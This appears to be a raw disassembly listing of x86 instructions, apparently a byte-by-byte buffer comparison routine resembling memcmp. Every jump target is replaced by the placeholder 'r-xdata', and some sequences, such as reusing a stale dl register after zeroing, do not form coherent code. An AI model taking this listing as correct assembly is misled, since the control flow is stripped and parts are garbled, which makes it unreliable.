mov edx [ eax - 0x7 ]
cmp edx [ ecx - 0x7 ]
je r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
pop ebx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x4 ]
movzx ebx [ ecx + 0x4 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xc ]
movzx esi [ eax - 0xc ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor eax eax
movzx esi dl
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xa ]
movzx esi [ eax - 0xa ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
movzx edx [ ecx - 0x2 ]
movzx esi [ eax - 0x2 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x1f ]
movzx esi [ eax - 0x1f ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xf ]
movzx esi [ eax - 0xf ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
mov esi [ eax + 0x8 ]
cmp esi [ ecx + 0x8 ]
je r-xdata
movzx esi [ eax + 0x5 ]
movzx ebx [ ecx + 0x5 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x3 ]
movzx ebx [ ecx + 0x3 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1e ]
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
mov eax edx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x8 ]
movzx ebx [ ecx + 0x8 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x6 ]
movzx ebx [ ecx + 0x6 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
mov eax edx
jmp r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x8 ]
movzx esi [ eax - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
jmp r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
mov esi [ eax + 0xc ]
cmp esi [ ecx + 0xc ]
je r-xdata
movzx esi [ eax + 0x9 ]
movzx ebx [ ecx + 0x9 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x7 ]
movzx ebx [ ecx + 0x7 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
sub eax ecx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
test eax eax
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x7 ]
movzx esi [ eax - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0xc ]
movzx ebx [ ecx + 0xc ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xa ]
movzx ebx [ ecx + 0xa ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x10 ]
cmp esi [ ecx + 0x10 ]
je r-xdata
movzx esi [ eax + 0xd ]
movzx ebx [ ecx + 0xd ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0xb ]
movzx ebx [ ecx + 0xb ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx ebx [ ecx + 0x10 ]
movzx esi [ eax + 0x10 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xe ]
movzx ebx [ ecx + 0xe ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x14 ]
cmp esi [ ecx + 0x14 ]
je r-xdata
movzx esi [ eax + 0x11 ]
movzx ebx [ ecx + 0x11 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0xf ]
movzx ebx [ ecx + 0xf ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x14 ]
movzx ebx [ ecx + 0x14 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x12 ]
movzx ebx [ ecx + 0x12 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x18 ]
cmp esi [ ecx + 0x18 ]
je r-xdata
movzx esi [ eax + 0x15 ]
movzx ebx [ ecx + 0x15 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x13 ]
movzx ebx [ ecx + 0x13 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x18 ]
movzx ebx [ ecx + 0x18 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x16 ]
movzx ebx [ ecx + 0x16 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x1c ]
cmp esi [ ecx + 0x1c ]
je r-xdata
movzx esi [ eax + 0x19 ]
movzx ebx [ ecx + 0x19 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x17 ]
movzx ebx [ ecx + 0x17 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x1c ]
